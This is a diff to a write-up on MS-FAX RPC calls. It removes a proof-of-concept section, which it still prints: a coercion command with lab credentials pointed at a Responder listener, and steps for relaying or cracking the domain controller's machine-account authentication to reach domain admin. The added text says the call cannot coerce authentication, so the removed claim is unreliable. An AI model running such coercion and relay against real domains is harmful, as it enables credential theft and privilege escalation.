@@ -21,26 +21,13 @@
 
 In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\SHAREDFAX` and bind to the desired [`MS-FAX`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) protocol (with uuid `6099fc12-3eff-11d0-abd0-00c04fd91a4e` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-FAX`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) protocol.
 
-The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\SHAREDFAX` This pipe is connected to the protocol [[MS-FAX]: Fax Server and Client Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) and allows to call RPC functions of this protocol. We will then call the remote [`FAX_SendDocumentEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/bac2e95f-f18b-448f-bb42-cc63b6ff04b2) function on the remote Windows Server (192.168.2.1) with the following parameters:
+**This call cannot be used to coerce an authentication.** Neither of its file parameters is a client-controlled path the server opens over the network:
 
-```cpp
-FAX_SendDocumentEx('192.168.2.51\x00')
-```
++ `lpcwstrFileName` (the fax body) is "the name of the file, **without path information** ... The body file is previously copied to the **server queue directory**" using the `FAX_StartCopyToServer` / `FAX_WriteFile` / `FAX_EndCopy` sequence ([MS-FAX] 3.1.4.1.73). It is resolved inside the server's own queue, not opened from a client path.
 
-We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
++ The cover-page file name in `lpcCoverPageInfo` is likewise found in the server queue directory. When the client marks it as not server-based, the server "SHOULD validate that the cover page template ... has a file extension of `.cov` and the file name string contains ... **only characters representing valid hexadecimal digits**". That filter (hex digits plus a fixed `.cov` extension) forbids the backslashes, colon and dots of a UNC path, so a path cannot be smuggled through it.
 
-```bash
-./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
-```
-
-![](./imgs/poc.png)
-
-This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:
-
-![](./imgs/hash.png)
-
-After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!
-
+The call also requires the prior `FAX_StartCopyToServer` → `FAX_WriteFile` → `FAX_EndCopy` sequence, but that sequence only stages a file inside the server's queue directory — it never opens a client-named location.
 
 ## Function technical detail
 
